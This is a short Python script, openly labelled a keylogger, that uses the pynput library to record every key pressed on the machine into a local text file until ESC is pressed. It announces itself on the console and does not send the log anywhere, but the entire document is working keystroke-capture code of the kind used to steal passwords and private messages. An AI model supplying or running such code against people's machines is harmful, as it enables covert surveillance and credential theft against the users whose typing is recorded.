from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop the keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger running... Press ESC to stop.")
    listener.join()
